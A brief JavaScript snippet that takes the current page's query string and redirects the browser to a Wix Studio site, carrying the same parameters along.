// Get current query parameters (e.g., "?source=google&id=123")
const currentQuery = window.location.search;

// Redirect with existing parameters
window.location.href = `https://zhua05nuo.wixstudio.com/zhuclever${currentQuery}`;